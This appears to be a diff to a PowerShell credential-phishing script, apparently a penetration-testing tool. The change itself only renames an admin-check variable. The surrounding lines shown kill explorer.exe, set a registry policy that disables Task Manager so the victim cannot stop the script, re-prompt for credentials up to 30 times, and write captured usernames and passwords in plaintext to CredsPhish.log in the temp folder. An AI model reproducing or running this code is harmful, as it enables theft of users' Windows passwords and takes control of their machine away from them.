@@ -27,9 +27,9 @@ $timestamp = $null
 taskkill /f /im explorer.exe
 $ComputerName = $env:COMPUTERNAME
 $CurrentDomain_Name = $env:USERDOMAIN
-$shellCreds = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+$shellCredsAdmin = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 ## Block Remote-Host 'task manager' to prevent users from aborting this script execution. (Admin privileges Required)
-If($shellCreds){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 1 -Force}
+If($shellCredsAdmin){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 1 -Force}
 
 
 ## Prerequisites
@@ -71,7 +71,7 @@ function Credentials(){
         # Change the next value to increase/decrease the number of times the msgbox prompts.
         If($counter -eq 30){
           ## This Line Un-Blocks Remote-Host 'task manager' after a valid cred as found or if reached 30 attempts. (Admin privileges Required)
-          If($shellCreds){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force}
+          If($shellCredsAdmin){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force}
           Start-Process -FilePath $env:windir\explorer.exe
           $status = $false
           exit
@@ -102,7 +102,7 @@ function Credentials(){
                     echo "   username  : $Username" >> $env:tmp\CredsPhish.log
                     echo "   password  : $Password" >> $env:tmp\CredsPhish.log
                     ## This Line Un-Blocks Remote-Host 'task manager' after a valid credential its found. (Admin privileges Required)
-                    If($shellCreds){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force}
+                    If($shellCredsAdmin){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force}
                     Start-Process -FilePath $env:windir\explorer.exe
                     $status = $false
                     exit
